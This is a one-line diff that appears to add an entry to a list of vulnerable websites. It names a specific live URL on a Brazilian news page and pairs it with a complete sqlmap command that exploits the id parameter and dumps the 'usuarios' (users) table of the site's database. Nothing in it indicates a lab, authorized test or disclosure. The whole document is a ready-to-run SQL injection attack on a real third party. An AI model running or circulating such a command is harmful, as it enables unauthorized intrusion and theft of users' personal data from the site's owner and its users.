@@ -1,0 +1,1 @@
+http://www.copozan.com.br/exibirnoticia.php?id_noticia=181 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.copozan.com.br/exibirnoticia.php?id_noticia=181 -D copozan -T usuarios --dump
